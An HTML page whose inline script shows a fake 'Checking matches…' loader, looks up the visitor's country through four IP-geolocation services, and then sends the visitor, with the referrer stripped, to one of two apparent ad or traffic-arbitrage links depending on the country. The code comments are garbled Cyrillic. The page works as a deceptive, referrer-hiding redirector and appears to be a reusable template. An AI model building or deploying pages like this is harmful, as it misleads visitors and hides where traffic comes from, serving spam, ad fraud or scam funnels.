<!DOCTYPE html>
<head>
<meta name="referrer" content="no-referrer">
</head>

<body>
<style>
  #geo-loader {
    position: fixed; inset: 0; background: #fff;
    display: flex; justify-content: center; align-items: center;
    font: 16px/1.4 Arial, sans-serif; color: #444; z-index: 999999;
  }
  #geo-loader .spinner {
    border: 3px solid #f3f3f3; border-top: 3px solid #3498db;
    border-radius: 50%; width: 28px; height: 28px;
    animation: spin 0.7s linear infinite; margin-right: 10px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>

<div id="geo-loader"><div class="spinner"></div> Checking matches‚Ä¶</div>

<script>
(function () {
  // --------- –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ ---------
  const SPECIAL = new Set(["GB","UK","DE","NL","IT","BE","CZ","RO","UA","SK"]);
  const LINK_SPECIAL = "https://smrtfbtrecsocial.com/STKEFSwImS";       // üîÅ –ø–æ–¥—Å—Ç–∞–≤—å —Å–≤–æ—é —Å—Å—ã–ª–∫—É
  const LINK_DEFAULT = "https://exoclick.live/";    // üîÅ –ø–æ–¥—Å—Ç–∞–≤—å —Å–≤–æ—é —Å—Å—ã–ª–∫—É
  const PER_REQ_TIMEOUT = 1200;                       // —Ç–∞–π–º-–∞—É—Ç –Ω–∞ –æ–¥–Ω–æ–≥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞, –º—Å
  const CACHE_KEY = "geo_cc_cache_v1";                // –∫–µ—à –≤ –ø—Ä–µ–¥–µ–ª–∞—Ö —Å–µ—Å—Å–∏–∏

  // --------- —É—Ç–∏–ª–∏—Ç—ã ---------
  function removeLoader() {
    const el = document.getElementById("geo-loader");
    if (el) el.remove();
  }

  // –ù–∞–¥—ë–∂–Ω—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –±–µ–∑ Referer (–¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –∫ meta no-referrer)
  function redirectNoReferrer(url) {
    try {
      // –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π —É–±–µ—Ä—ë–º –ª–æ–∞–¥–µ—Ä –ø–µ—Ä–µ–¥ —É—Ö–æ–¥–æ–º
      removeLoader();
      // —Å—Å—ã–ª–∫–∞ —Å rel="noreferrer" –∏ referrerpolicy
      const a = document.createElement("a");
      a.href = url;
      a.rel = "noreferrer";
      a.referrerPolicy = "no-referrer";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      // fallback, –µ—Å–ª–∏ –≤–¥—Ä—É–≥ –∫–ª–∏–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω:
      setTimeout(() => { location.replace(url); }, 50);
    } catch {
      location.replace(url);
    }
  }

  function fetchWithTimeout(url, ms, controller) {
    const t = setTimeout(() => controller.abort(), ms);
    return fetch(url, { mode: "cors", signal: controller.signal })
      .finally(() => clearTimeout(t));
  }

  async function getCountryFast() {
    // 1) –∫–µ—à –Ω–∞ —Å–µ—Å—Å–∏—é ‚Äî –º–æ–º–µ–Ω—Ç–∞–ª—å–Ω—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –ø–æ–≤—Ç–æ—Ä–∞—Ö
    try {
      const cached = sessionStorage.getItem(CACHE_KEY);
      if (cached) return cached.toUpperCase();
    } catch {}

    // 2) –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã–µ –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã —Å –æ—Ç–º–µ–Ω–æ–π –ø—Ä–æ–∏–≥—Ä–∞–≤—à–∏—Ö
    const ctrls = [new AbortController(), new AbortController(), new AbortController(), new AbortController()];
    const tasks = [
      fetchWithTimeout("https://ipinfo.io/json", PER_REQ_TIMEOUT, ctrls[0])
        .then(r => r.json()).then(j => j && j.country),
      fetchWithTimeout("https://ipapi.co/json/", PER_REQ_TIMEOUT, ctrls[1])
        .then(r => r.json()).then(j => j && j.country_code),
      fetchWithTimeout("https://ipwho.is/", PER_REQ_TIMEOUT, ctrls[2])
        .then(r => r.json()).then(j => j && j.country_code),
      fetchWithTimeout("https://get.geojs.io/v1/ip/country.json", PER_REQ_TIMEOUT, ctrls[3])
        .then(r => r.json()).then(j => j && (j.country || j.country_code)),
    ];

    let winner = null, resolved = false;

    await Promise.any(tasks.map(p => p.then(cc => {
      if (resolved || !cc) return Promise.reject();
      winner = String(cc).toUpperCase();
      resolved = true;
      return winner;
    })) ).catch(() => {});

    // –æ–±—Ä—ã–≤–∞–µ–º –ø—Ä–æ–∏–≥—Ä–∞–≤—à–∏–µ –∑–∞–ø—Ä–æ—Å—ã (—ç–∫–æ–Ω–æ–º–∏–º —Ç—Ä–∞—Ñ–∏–∫/–≤—Ä–µ–º—è)
    ctrls.forEach(c => { try { c.abort(); } catch {} });

    if (winner) {
      // –Ω–æ—Ä–º–∞–ª–∏–∑—É–µ–º UK ‚Üí GB
      if (winner === "UK") winner = "GB";
      try { sessionStorage.setItem(CACHE_KEY, winner); } catch {}
    }

    return winner; // –º–æ–∂–µ—Ç –±—ã—Ç—å null, –µ—Å–ª–∏ –≤—Å–µ —É–ø–∞–ª–∏/—Ç–∞–π–º-–∞—É—Ç—ã
  }

  // --------- –∑–∞–ø—É—Å–∫ ---------
  document.addEventListener("DOMContentLoaded", async () => {
    let cc = null;
    try {
      cc = await getCountryFast();
    } catch {}

    // –µ—Å–ª–∏ –Ω–∏–∫—Ç–æ –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª ‚Äî –∏–¥—ë–º –Ω–∞ –¥–µ—Ñ–æ–ª—Ç
    const target = (cc && SPECIAL.has(cc)) ? LINK_SPECIAL : LINK_DEFAULT;
    redirectNoReferrer(target);
  });
})();
</script>
</body>
